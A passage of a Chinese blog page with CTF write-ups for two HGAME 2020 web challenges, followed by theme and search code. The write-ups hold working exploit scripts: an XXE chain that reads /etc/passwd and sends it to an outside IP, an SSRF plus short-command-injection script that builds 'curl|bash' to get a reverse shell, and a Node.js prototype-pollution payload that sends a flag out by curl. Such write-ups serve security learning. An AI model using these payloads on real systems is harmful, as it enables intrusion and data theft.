+<h2 id="代打出题人">代打出题人</h2>
+<p>发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM &quot;http://39.105.176.37/ext1.dtd&quot;&gt;%aaa;%ccc;%ddd;]&gt;</span><br><span class="line">&lt;msg&gt;&lt;id&gt;12&lt;/id&gt;&lt;name&gt;12&lt;/name&gt;&lt;level&gt;12&lt;/level&gt;&lt;time&gt;12&lt;/time&gt;&lt;/msg&gt;</span><br></pre></td></tr></table></figure>
+<p>服务器上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % bbb SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &apos;http://39.105.176.37:9999?p=%bbb;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>读到内网东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.21.0.76	hgame-private</span><br><span class="line">172.21.0.31	f9f1b9b99e13</span><br></pre></td></tr></table></figure>
+<p>然后服务器上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % bbb SYSTEM &quot;php://filter/zlib.deflate/read=convert.base64-encode/resource=http://172.21.0.76?token=xxxxxxxxxxxx&quot;&gt;&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#37; ddd SYSTEM &apos;http://39.105.176.37:9999?p=%bbb;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>读到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$token = @$_GET[<span class="string">'token'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($token)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"璇峰甫涓婃偍鐨勯槦浼峵oken璁块棶! /?token="</span>);</span><br><span class="line">&#125;</span><br><span class="line">$api = <span class="string">"http://checker/?token="</span>.$token;</span><br><span class="line">$t = file_get_contents($api);</span><br><span class="line"><span class="keyword">if</span>($t !== <span class="string">"ok"</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"闃熶紞token閿欒"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/sandbox/'</span>. md5(<span class="string">"hgame2020"</span> . $token);;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">$content = $_GET[<span class="string">'v'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($content)) &#123;</span><br><span class="line">    $cmd = substr($content,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'r'</span>])) &#123;</span><br><span class="line">    system(<span class="string">'rm -rf ./*'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>hitcon题目， 脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">url = <span class="string">'http://bdctr.hgame.day-day.work/submit.php'</span></span><br><span class="line">ip = <span class="string">'0x2769b025'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=http://172.21.0.76?token=Xvb8W0EAZIIHMzZDyCplLeRJZcdaNt2m&amp;v=&#123;0&#125;"&gt;"""</span>.format(cmd)</span><br><span class="line">    xml += <span class="string">'\r\n'</span></span><br><span class="line">    xml += <span class="string">"""&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://39.105.176.37?p=%file;'&gt;"&gt;"""</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'test.dtd'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(xml)</span><br><span class="line">        f.close()</span><br><span class="line"><span class="comment">#build_xml('id')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span><span class="params">()</span>:</span></span><br><span class="line">    xml = <span class="string">"&lt;?xml version=\"1.0\"?&gt;\r\n&lt;!DOCTYPE message [\r\n&lt;!ENTITY % remote SYSTEM \"http://39.105.176.37/test.dtd\"&gt;\r\n%remote;%int;%send;\r\n]&gt;\r\n\r\n&lt;msg&gt;&lt;id&gt;99&lt;/id&gt;&lt;name&gt;asy&lt;/name&gt;&lt;level&gt;222&lt;/level&gt;&lt;time&gt;555&lt;/time&gt;&lt;/msg&gt;"</span></span><br><span class="line">    <span class="comment">#print(xml)</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    re = requests.post(url,headers=headers,data=xml).text</span><br><span class="line">    <span class="comment">#print(re)</span></span><br><span class="line"><span class="comment">#build_xml('id')</span></span><br><span class="line"><span class="comment">#build_req()</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\\\'</span>,</span><br><span class="line">    <span class="string">'ls&gt;_'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;-t\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>,</span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>,</span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash`</span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;25\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;b0\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;27\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;x\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\\\'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>,</span><br><span class="line">    <span class="string">'sh g'</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    print(i)</span><br><span class="line">    build_xml(quote(i))</span><br><span class="line">    build_req()</span><br></pre></td></tr></table></figure>
+<p>放vps上面跑,监听得shell</p>
+<p><img src="/images/image-20200210000240936.png" alt="image-20200210000240936"></p>
+<h2 id="只狼">只狼</h2>
+<p>nodejs原型链污染</p>
+<p>漏洞代码</p>
+<p>​         <img src="/images/image-1582424130833.png__thumbnail" alt="img"></p>
+<p>​        <img src="/images/image-1582424145702.png__thumbnail" alt="img"></p>
+<p><img src="/images/image.png__thumbnail" alt="img"></p>
+<p>​    exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">baseurl = <span class="string">'http://sekiro.hgame.babelfish.ink/'</span> </span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">'solution'</span>:<span class="string">'123'</span>,<span class="string">'__proto__'</span>:&#123;<span class="string">"additionalEffect"</span>:<span class="string">"process.mainModule.require('child_process').exec('curl http://39.105.176.37:9999/`cat /flag|base64`')"</span>&#125;&#125;</span><br><span class="line">se = requests.Session()</span><br><span class="line"><span class="comment">#get /</span></span><br><span class="line">re = se.get(baseurl)</span><br><span class="line"><span class="comment">#get /info</span></span><br><span class="line">re = se.get(baseurl+<span class="string">'info'</span>)</span><br><span class="line"><span class="comment">#get /attack</span></span><br><span class="line">re = se.get(baseurl+<span class="string">'attack'</span>)</span><br><span class="line"><span class="comment">#post /action</span></span><br><span class="line">re = se.post(baseurl+<span class="string">'action'</span>,headers=header,data=json.dumps(data)).text</span><br><span class="line">print(re)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/20/Real-ip/" rel="next" title="怎么找到一个网站的真实ip">
+                <i class="fa fa-chevron-left"></i> 怎么找到一个网站的真实ip
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/24/thinkphp-about/" rel="prev" title="thinkphp相关">
+                thinkphp相关 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/dogdog.jpg" alt="ch4ser">
+            
+              <p class="site-author-name" itemprop="name">ch4ser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/ch4ser1" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://forever404.cn" title="Forever" target="_blank">Forever</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yml-sec.top/" title="YeMoLi" target="_blank">YeMoLi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://althims.com" title="Moyu" target="_blank">Moyu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://handsomedog.top" title="Handsomedog" target="_blank">Handsomedog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fightingtree.github.io" title="FightingTree" target="_blank">FightingTree</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的博客后台"><span class="nav-number">1.1.</span> <span class="nav-text">Cosmos的博客后台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cosmos-的留言板"><span class="nav-number">1.2.</span> <span class="nav-text">cosmos 的留言板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cosmos-的新语言"><span class="nav-number">1.3.</span> <span class="nav-text">cosmos 的新语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cosmos-的聊天室"><span class="nav-number">1.4.</span> <span class="nav-text">cosmos 的聊天室</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#序列之争-Ordinal-Scale"><span class="nav-number">2.1.</span> <span class="nav-text">序列之争 - Ordinal Scale</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二发入魂"><span class="nav-number">2.2.</span> <span class="nav-text">二发入魂</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的二手市场"><span class="nav-number">2.3.</span> <span class="nav-text">Cosmos的二手市场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cosmos-的留言板2"><span class="nav-number">2.4.</span> <span class="nav-text">cosmos 的留言板2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cosmos-的聊天室2-0"><span class="nav-number">2.5.</span> <span class="nav-text">cosmos 的聊天室2.0</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">week4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代打出题人"><span class="nav-number">3.1.</span> <span class="nav-text">代打出题人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#只狼"><span class="nav-number">3.2.</span> <span class="nav-text">只狼</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">77.4k</span>
+  
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
+    </span>
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('3');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
